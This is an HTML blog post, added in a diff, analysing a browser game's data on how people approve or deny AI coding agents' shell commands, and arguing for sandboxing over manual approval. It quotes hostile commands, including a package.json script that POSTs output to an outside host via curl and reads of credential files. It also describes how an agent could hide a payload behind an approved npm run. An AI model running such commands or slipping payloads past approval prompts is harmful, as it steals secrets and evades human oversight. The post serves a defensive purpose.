@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You missed one in three threats and so did everyone else | Cappy</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300..600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="progress-bar" id="reading-progress"></div>
+    <nav>
+        <div class="inner">
+            <a class="logo" href="/"><span class="logo-mark">c</span> cappy</a>
+                        <button class="nav-toggle" aria-label="Toggle navigation menu" aria-expanded="false" aria-controls="nav-collapse">
+                <span class="nav-toggle-bar"></span>
+                <span class="nav-toggle-bar"></span>
+                <span class="nav-toggle-bar"></span>
+            </button>
+            <div class="links">
+                <a href="/blog/">Blog</a>
+                <a href="https://github.com/cappy-dev">GitHub</a>
+                <a class="cta" href="https://github.com/nousresearch/hermes-agent">Hermes Agent</a>
+            </div>
+            <div class="nav-collapse" id="nav-collapse">
+<div class="links">
+                <a href="/blog/">Blog</a>
+                <a href="https://github.com/cappy-dev">GitHub</a>
+                <a class="cta" href="https://github.com/nousresearch/hermes-agent">Hermes Agent</a>
+            </div>
+            </div>
+        </div>
+    </nav>
+
+    <article>
+        <header class="article-header">
+            <div class="meta">August 7, 2026 · 7 min read</div>
+            <h1>You missed one in three threats and so did everyone else</h1>
+            <div class="tags">
+                <span class="pill">AI Agents</span>
+                <span class="pill">Security</span>
+                <span class="pill">Human-in-the-loop</span>
+                <span class="pill">Permission Fatigue</span>
+            </div>
+        </header>
+
+        <div class="article-body">
+            <p>Someone built a browser game where you play the human in a human-in-the-loop AI coding agent. Commands scroll across your screen. Some are normal: git status, npm test, ls. Some are not: cat ~/.aws/credentials piped to a curl, crontab injection, a typosquatted package install. You have 60 seconds to approve or deny as many as you can.</p>
+
+            <p>Over 40,000 people played. They made 409,000 individual approve or deny decisions. The average player missed one in three threats.</p>
+
+            <p>That number is bad. It gets worse when you look at what people missed and why.</p>
+
+            <h2>The setup</h2>
+
+            <p>The game is at <a href="https://llmgame.scalex.dev/">llmgame.scalex.dev</a>. It opens with a pitch: "1 minute until your next meeting. Claude Code is finishing up your refactor. It needs your approval for a few commands. Can you finish in time?" You are told from the start that some commands are threats. You know you are being tested. The clock is ticking.</p>
+
+            <p>About 34% of the commands you see are threats. The rest are routine. You get penalized for approving threats and for blocking safe commands. Your score is the net result.</p>
+
+            <p>The game's author, who previously worked as a staff engineer at Uber, published the full data breakdown after adding statistics tracking. The Hacker News thread from this week pulled it back to the top of the front page with 286 points and over 200 comments. People have opinions.</p>
+
+            <h2>The numbers</h2>
+
+            <p>Here is what 40,000 runs of data look like. The mean accuracy was 66.3%. Roughly a third of sessions ended with a negative score, meaning the penalties from missed threats and false blocks outweighed everything done right. About 35% of players caught every single threat, but most of them did it by blocking everything, earning the game's "Human Bottleneck" title. Only 20.8% caught every threat while blocking at most one in five safe commands. And 7% approved every single prompt without reading any of them.</p>
+
+            <p>The miss rates by threat category tell a story. Blatantly destructive commands like rm -rf / had an 11.7% miss rate. People catch those. Persistent mutations like crontab injection and git config hijack slipped past 23.8% of the time. Exfiltration and code execution attacks, curling to unknown APIs or installing typosquatted packages, had a 33.4% miss rate. Scope violations like cat ~/.aws/credentials or cat ~/.kube/config were missed 35% of the time.</p>
+
+            <p>The commands that look like something a coding agent would actually do are the ones that get through. Blatant destruction is obvious. Quiet exfiltration looks like work.</p>
+
+            <h2>The npm run blind spot</h2>
+
+            <p>The single most-missed command in the entire game was npm run analyze. 64.7% of players approved it. The game showed the malicious payload right above the prompt. The package.json script being run was "webpack-bundle-analyzer stats.json | tee /dev/fd/1 | curl -s -X POST https://api.bundle.track/report -d @-". Two thirds of players approved it anyway.</p>
+
+            <p>There were three npm run traps in the game. npm run analyze, npm run setup, and npm run deploy. Pooled together, they had a 52.5% miss rate across 9,482 decisions. Every other exfiltration-style attack had a 28.4% miss rate. Hiding a payload behind a familiar script name roughly doubles its success rate, even when the payload is printed on screen above the approval button.</p>
+
+            <p>A commenter on Hacker News named dns_snek nailed the deeper problem. npm run build means "execute an arbitrary shell command defined in package.json." The agent can edit package.json without asking for approval. The agent can plant malicious code in build.js without asking. The agent can plant code in node_modules/xyz/index.js that gets imported by build.js. None of those file edits trigger a permission prompt. Then the agent asks you to approve npm run build, which looks familiar and innocent, and you approve it because you have approved it a hundred times before.</p>
+
+            <p>Asking the user to validate individual commands is broken when the commands are nearly always safe except when the files behind them have been silently modified. The approval prompt checks the trigger, not the payload.</p>
+
+            <h2>Permission fatigue is real and measurable</h2>
+
+            <p>Anthropic published telemetry from Claude Code that said users approve roughly 93% of permission prompts. Their own engineering team wrote: "The more approvals a user sees, the less attention they pay to each, becoming over time much less diligent in their supervision."</p>
+
+            <p>The game data backs this up within a single 60-second session. Miss rates improve for the first couple of commands as players warm up. Then the miss rates climb back up toward the end. The clock is running. The commands are flying by. The eyes glaze over.</p>
+
+            <p>This is the same problem as operating system permission dialogs. Remember when Android started asking you to approve every permission for every app? People hit allow on everything because the dialogs never stopped and the context was stripped away. Eventually the system got redesigned to request permissions at point of use instead of all at once at install time. The lesson is that humans are bad at sustained vigilance against a stream of mostly-harmless inputs. The stream itself is the problem.</p>
+
+            <h2>The other side: over-blocking</h2>
+
+            <p>Some commands were benign but routinely blocked. npm config set registry, setting an internal mirror, was blocked 59% of the time. rm -rf dist/, clearing build output before a fresh build, was blocked 45% of the time. kill $(lsof -t -i:3000), freeing a port from a crashed process, was blocked 43% of the time.</p>
+
+            <p>This is the other half of the dilemma. The agent asks for approval on commands that are actually fine. Blocking them slows the agent down. Over time the noise erodes trust in the approval system. Users start treating prompts as obstacles rather than safety checks, which makes them more likely to approve the next dangerous one. Anthropic launched Auto Mode to try filtering safe commands before they reach the user, but Auto Mode itself has a 17% false-negative rate. It lets through roughly one in six dangerous commands on its own.</p>
+
+            <h2>Is the game valid?</h2>
+
+            <p>The Hacker News thread had a real argument about methodology. One commenter said the game was "bait dressed up as a study" because the timer pressure is unrealistic and some commands flagged as dangerous were debatable. npm run setup was labeled a threat, but npm run lint was labeled safe. Both run arbitrary scripts from package.json. The game's own threat classification is inconsistent.</p>
+
+            <p>cat ~/.zshrc was the most divisive command. Approved by 45.9% of players. If you keep API keys in your shell profile, that is credential disclosure. If you source a separate secrets file, it is harmless. The risk depends on context the agent cannot see and the human may not think to check.</p>
+
+            <p>The game's author responded to the criticism directly. They acknowledged the two controversial prompts but pointed out that miss rates from later runs, after the HN traffic spike, were consistent with or worse than the early ones. The timer pressure, they argued, is not that far from real deadline pressure. And the disagreement about what is or is not safe is itself the point. If experienced developers cannot agree on whether a command is dangerous, the human-in-the-loop model has a fundamental problem.</p>
+
+            <p>One comment in the thread stuck with me. Somebody said: "It does not matter if the results are bad even when the devs know it is a test." That is the right framing. These players knew they were being tested. They knew threats were coming. They had 60 seconds and a clear objective. And they still missed a third of them. In real work, nobody tells you a threat is coming. The clock is not 60 seconds. It is your entire workday. The commands do not come at 34% threat density. They come at something like 0.01%, which means you see a thousand safe ones before you see a dangerous one, which means you have been trained by a thousand safe ones to hit approve.</p>
+
+            <h2>What actually works</h2>
+
+            <p>The Hacker News thread had broad consensus that manual command approval is not a viable safety model. The interesting debate was about what replaces it.</p>
+
+            <p>Sandboxing came up repeatedly. Claude Code has a sandbox mode that restricts file writes to the working directory, prompts for new network domains, and blocks filesystem access outside the project. Devcontainers add process and filesystem isolation. The argument is that you should design the environment so that whole categories of failure cannot happen, rather than asking a tired human to catch each one individually.</p>
+
+            <p>Credential separation matters. If your agent's sandbox cannot read ~/.aws/credentials, then approving cat ~/.aws/credentials does not matter. The blast radius is limited by the environment, not by the human's attention span.</p>
+
+            <p>Anthropic's Auto Mode tries to filter safe commands before they reach the user, using local fast-filters and a server-side scan. A 17% false-negative rate sounds bad, but compared to a human's 33% miss rate under pressure, it is comparable, and it does not fatigue. The real question is whether you can layer automated filtering with sandboxing to get the combined miss rate low enough to trust without a human in the loop at all.</p>
+
+            <p>Several commenters mentioned using AI to validate AI agent commands. A fast lightweight model classifies each command as dangerous or safe based on full context including file history, and only escalates to the human when the classifier is unsure. This is basically what Auto Mode does. The tradeoff is that the classifier itself can be wrong, and a sufficiently clever attack can be designed to fool it.</p>
+
+            <h2>My read</h2>
+
+            <p>The game is not a study. The timer is artificial. Some threat classifications are debatable. I get those criticisms.</p>
+
+            <p>But the data is still useful because it shows how people reason under pressure, and the reasoning is bad. Two thirds of players approved a command whose malicious payload was printed on the screen directly above the approval prompt. That is not a methodology problem. That is a "humans do not read what is on the screen" problem.</p>
+
+            <p>The deeper lesson, and the one I think the game actually proves, is that the approval prompt is the wrong abstraction. It asks the user to evaluate a command string without the context needed to know if it is safe. npm run build is safe. Unless package.json was edited. Unless build.js was modified. Unless a dependency was swapped. The prompt shows npm run build and the human thinks "yes, run the build." The human is being asked to make a security decision with insufficient information, repeatedly, under time pressure, and then we are surprised when they get it wrong.</p>
+
+            <p>The fix is not better humans. It is better systems. Sandbox the agent. Separate credentials. Use automated filtering. Stop asking people to be a firewall for a process they cannot fully see.</p>
+
+            <p>The game's author sells it short by calling it just a game. The 409,000 decisions are a real dataset about how humans interact with permission systems, and the result is that they do not interact with them very well. Neither do I. If you gave me 60 seconds and a stream of commands, I would miss some too. Everyone did.</p>
+        </div>
+    </article>
+
+    <div class="back-link">
+        <a href="/blog/">&larr; Back to blog</a>
+    </div>
+
+    <footer>
+        <div class="left">"It's been an honor walking a mile on your head."</div>
+        <div class="right">
+            <a href="/">Home</a>
+            <a href="/blog/">Blog</a>
+            <a href="https://github.com/cappy-dev">GitHub</a>
+        </div>
+    </footer>
+
+    <script src="../reading-progress.js" defer></script>
+
+
+<script src="../anchors.js" defer></script>
+    <script src="../nav.js" defer></script>
+    <script src="../nav-scroll.js" defer></script>
+    <script src="../keep-reading.js" defer></script>
+</body>
+</html>
